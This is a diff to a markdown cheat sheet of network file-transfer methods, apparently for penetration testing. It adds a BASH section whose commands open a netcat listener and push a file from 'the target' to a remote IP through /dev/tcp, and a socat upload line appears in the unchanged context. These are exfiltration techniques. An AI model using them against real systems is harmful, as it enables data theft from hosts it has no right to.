@@ -1,4 +1,4 @@
-# 1001 ways of moving files around in a network
+# Oat's 1001 ways of moving files around in a network
 
 Ever had to work with a remote host that seemed to resist any attempt to transfer files from/to it? Dread no more! Here are 1001 (not really) ways to exchange files in a network.
 
@@ -6,16 +6,17 @@ Ever had to work with a remote host that seemed to resist any attempt to transfe
 
 ### Table of Content
 
-1. [FTP](./file_transfers.md#ftp)
-2. [HTTP](./file_transfers.md#http)
-3. [SMB](./file_transfers.md#smb)
-4. [Netcat](./file_transfers.md#netcat)
-5. [SSH/SCP](./file_transfers.md#sshscp)
-6. [Python](./file_transfers.md#python)
-7. [PHP](./file_transfers.md#php)
-8. [NFS](./file_transfers.md#nfs)
-9. [RDP](./file_transfers.md#rdp)
-10. [Copy&Paste](./file_transfers.md#copy-paste)
+1. [FTP](#ftp)
+2. [HTTP](#http)
+3. [SMB](#smb)
+4. [Netcat](#netcat)
+5. [BASH](#bash)
+6. [SSH/SCP](#sshscp)
+7. [Python](#python)
+8. [PHP](#php)
+9. [NFS](#nfs)
+10. [RDP](#rdp)
+11. [Copy&Paste](#copy-paste)
 
 ## FTP
 
@@ -346,6 +347,28 @@ Of course you can also do it the other way around and start the listener on the 
 Just reverse the above commands. The process is identical.
 
 
+## BASH
+```default        
+ ██╗ ██╗ ██╗    ██████╗  █████╗ ███████╗██╗  ██╗
+████████╗██║    ██╔══██╗██╔══██╗██╔════╝██║  ██║
+╚██╔═██╔╝██║    ██████╔╝███████║███████╗███████║
+████████╗╚═╝    ██╔══██╗██╔══██║╚════██║██╔══██║
+╚██╔═██╔╝██╗    ██████╔╝██║  ██║███████║██║  ██║
+ ╚═╝ ╚═╝ ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+```
+
+Listen for a file with netcat on your own machine:
+```bash
+nc -vlnp 4545 > outputfile.txt
+```
+
+Upload a file on the target using `/dev/tcp/` and common bash tools:
+
+```bash
+cat inputfile.txt > /dev/tcp/10.0.2.4/4545
+```
+
+
 ## Socat
 
 ```default
@@ -402,7 +425,6 @@ Connect and upload:
 ```bash
 socat -u FILE:"/tmp/whatever/upload.txt" openssl-connect:10.0.2.4:5778,verify=0
 ```
-
 
 ## SSH/SCP
 
